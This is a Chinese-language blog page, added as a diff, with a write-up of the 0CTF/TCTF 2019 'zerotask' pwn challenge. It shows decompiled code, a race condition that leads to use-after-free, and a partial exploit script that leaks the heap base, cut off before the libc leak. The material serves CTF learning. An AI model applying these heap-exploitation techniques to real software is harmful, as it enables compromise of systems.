@@ -1,0 +1,1379 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。每次看到自闭了说不看了，结果过了会又回去看了，真香。所以现在赛后复现下pwn题。 ###zerotask 防护机制： 1234567☁  zerotask [master] ⚡  checksec task [*] &amp;apos;/home/zs0zrc/game/TCTF2019/pwn/zerotask_">
+<meta name="keywords" content="writeup,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF&#x2F;TCTF2019 PWN 复现">
+<meta property="og:url" content="http://yoursite.com/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。每次看到自闭了说不看了，结果过了会又回去看了，真香。所以现在赛后复现下pwn题。 ###zerotask 防护机制： 1234567☁  zerotask [master] ⚡  checksec task [*] &amp;apos;/home/zs0zrc/game/TCTF2019/pwn/zerotask_">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/picture/1553949142123.png">
+<meta property="og:image" content="http://yoursite.com/picture/1553956567752.png">
+<meta property="og:updated_time" content="2019-03-30T14:40:12.615Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF&#x2F;TCTF2019 PWN 复现">
+<meta name="twitter:description" content="很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。每次看到自闭了说不看了，结果过了会又回去看了，真香。所以现在赛后复现下pwn题。 ###zerotask 防护机制： 1234567☁  zerotask [master] ⚡  checksec task [*] &amp;apos;/home/zs0zrc/game/TCTF2019/pwn/zerotask_">
+<meta name="twitter:image" content="http://yoursite.com/picture/1553949142123.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/">
+
+
+
+
+
+  <title>0CTF/TCTF2019 PWN 复现 | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">0CTF/TCTF2019 PWN 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T11:10:05+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-s-writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF's writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/" class="leancloud_visitors" data-flag-title="0CTF/TCTF2019 PWN 复现">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.3k字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。每次看到自闭了说不看了，结果过了会又回去看了，真香。所以现在赛后复现下pwn题。</p>
+<p>###zerotask</p>
+<p>防护机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  zerotask [master] ⚡  checksec task </span><br><span class="line">[*] &apos;/home/zs0zrc/game/TCTF2019/pwn/zerotask_pwn/zerotask/task&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>题目一共给了三个文件，一个执行文件，两个动态链接库。</p>
+<p>程序一共有三个功能，add_task添加任务，delete_task删除任务，go执行任务</p>
+<p><strong>add_task</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">task *<span class="title">add_task</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  task *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  task *s; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Task id : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  id = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Encrypt(1) / Decrypt(2): "</span>);</span><br><span class="line">  choice = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( choice != <span class="number">1</span> &amp;&amp; choice != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_11A8(choice, s) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  s-&gt;id = id;</span><br><span class="line">  s-&gt;next = task_ptr;</span><br><span class="line">  result = s;</span><br><span class="line">  task_ptr = s;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_11A8</span><span class="params">(<span class="keyword">int</span> choice, task *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Key : "</span>, buf);</span><br><span class="line">  sub_F82(&amp;buf-&gt;type + <span class="number">4</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"IV : "</span>, <span class="number">32L</span>L);</span><br><span class="line">  sub_F82(&amp;buf-&gt;KEY[<span class="number">28</span>], <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data Size : "</span>, <span class="number">16L</span>L);</span><br><span class="line">  v5 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> || v5 &gt; <span class="number">4096</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf-&gt;size = v5;</span><br><span class="line">  buf-&gt;ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_EncryptInit_ex(buf-&gt;ctx, v3, <span class="number">0L</span>L, &amp;buf-&gt;type + <span class="number">4</span>, &amp;buf-&gt;KEY[<span class="number">28</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_DecryptInit_ex(buf-&gt;ctx, v3, <span class="number">0L</span>L, &amp;buf-&gt;type + <span class="number">4</span>, &amp;buf-&gt;KEY[<span class="number">28</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  LODWORD(buf-&gt;type) = choice;</span><br><span class="line">  buf-&gt;data = <span class="built_in">malloc</span>(buf-&gt;size);</span><br><span class="line">  <span class="keyword">if</span> ( !buf-&gt;data )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data : "</span>, v3);</span><br><span class="line">  sub_F82(buf-&gt;data, buf-&gt;size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要功能是创建task，可以控制分配的明文空间的大小。这里有点坑的是 ida反编译的代码有点问题，就是  id和next字段的偏移会显示错误，看汇编可以看到next是在0x68的位置，但反编译的代码显示在0xd处……同时 sub_11A8函数的参数也会识别错误，需要自己修改下，我上面的是修改后的。</p>
+<p>task结构体：(简陋的逆向了一个结构体)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 task            struc ; (sizeof=0x70, mappedto_6)</span><br><span class="line">00000000 data            dq ?                    ; offset</span><br><span class="line">00000008 size            dq ?</span><br><span class="line">00000010 type            dq ?</span><br><span class="line">00000018 KEY             db 32 dup(?)</span><br><span class="line">00000038 IV              db 16 dup(?)</span><br><span class="line">00000048 padding         db 16 dup(?)</span><br><span class="line">00000058 ctx             dq ?                    ; offset</span><br><span class="line">00000060 id              dd ?</span><br><span class="line">00000064 field_64        dd ?</span><br><span class="line">00000068 next            dq ?                    ; offset</span><br><span class="line">00000070 task            ends</span><br></pre></td></tr></table></figure>
+<p><strong>delete</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  task *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  task *v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = task_ptr;</span><br><span class="line">  v2 = task_ptr;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Task id : "</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( task_ptr &amp;&amp; idx == *(task_ptr + <span class="number">0x60</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    task_ptr = *(task_ptr + <span class="number">0x68</span>);</span><br><span class="line">    EVP_CIPHER_CTX_free(ptr-&gt;ctx);</span><br><span class="line">    <span class="built_in">free</span>(ptr-&gt;data);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( idx == ptr-&gt;id )</span><br><span class="line">      &#123;</span><br><span class="line">        v2-&gt;next = ptr-&gt;next;</span><br><span class="line">        EVP_CIPHER_CTX_free(ptr-&gt;ctx);</span><br><span class="line">        <span class="built_in">free</span>(ptr-&gt;data);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = ptr;</span><br><span class="line">      ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将task的chunk释放掉，同时释放 ctx结构体以及申请的data空间。</p>
+<p><strong>go</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">pthread_t</span> newthread; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  task *arg; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Task id : "</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">for</span> ( arg = task_ptr; arg; arg = arg-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == arg-&gt;id )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_create(&amp;newthread, <span class="number">0L</span>L, start_routine, arg);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">start_routine</span><span class="params">(task *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int128 v2; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = buf;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Prepare..."</span>);</span><br><span class="line">  sleep(<span class="number">2u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(ciphertext, <span class="number">0</span>, <span class="number">0x1010</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !EVP_CipherUpdate(*(v2 + <span class="number">0x58</span>), ciphertext, &amp;v1, *v2, *(v2 + <span class="number">8</span>)) )</span><br><span class="line">    pthread_exit(<span class="number">0L</span>L);</span><br><span class="line">  *(&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  <span class="keyword">if</span> ( !EVP_CipherFinal_ex(*(v2 + <span class="number">88</span>), ciphertext + *(&amp;v2 + <span class="number">1</span>), &amp;v1) )</span><br><span class="line">    pthread_exit(<span class="number">0L</span>L);</span><br><span class="line">  *(&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext: "</span>);</span><br><span class="line">  sub_107B(<span class="built_in">stdout</span>, ciphertext, *(&amp;v2 + <span class="number">1</span>), <span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  pthread_exit(<span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>go功能开启一个线程，根据输入的task_id，执行加密或者解密操作，然后将结果输出。漏洞也出现在这里，因为它开启线程后还sleep(2u)， 很明显的一个条件竞争漏洞…….我当时竟然看不出来，通过这个漏洞可以造成UAF 。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>通过UAF就可以泄露出heap和libc的地址了，不过因为它delete时会将ctx结构体也free掉，如果要泄露的话，delete后要重新创建一个task，不然会报错。</p>
+<p>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add_task(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#通过这个就可以泄露地址了</span></span><br></pre></td></tr></table></figure>
+<p>泄露heap地址:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_heap</span><span class="params">()</span>:</span></span><br><span class="line">    add_task(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'d'</span>*<span class="number">0x90</span>)</span><br><span class="line">    add_task(<span class="number">10</span>,<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'c'</span>*<span class="number">0x90</span>)</span><br><span class="line">    add_task(<span class="number">11</span>,<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'c'</span>*<span class="number">0x90</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    go(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    add_task(<span class="number">10</span>,<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">''</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">'text: \n'</span>)</span><br><span class="line">    data = p.recvline(<span class="string">'\n'</span>)</span><br><span class="line">    data = data.replace(<span class="string">" "</span>,<span class="string">''</span>).strip()</span><br><span class="line"></span><br><span class="line">    plain = mc.decrypt(data)</span><br><span class="line">    heap_addr=u64(plain[:<span class="number">8</span>])</span><br><span class="line">    heap_base = heap_addr - <span class="number">0x14c0</span></span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line">    <span class="keyword">return</span> heap_base</span><br></pre></td></tr></table></figure>
+<p>泄露libc地址：</p>
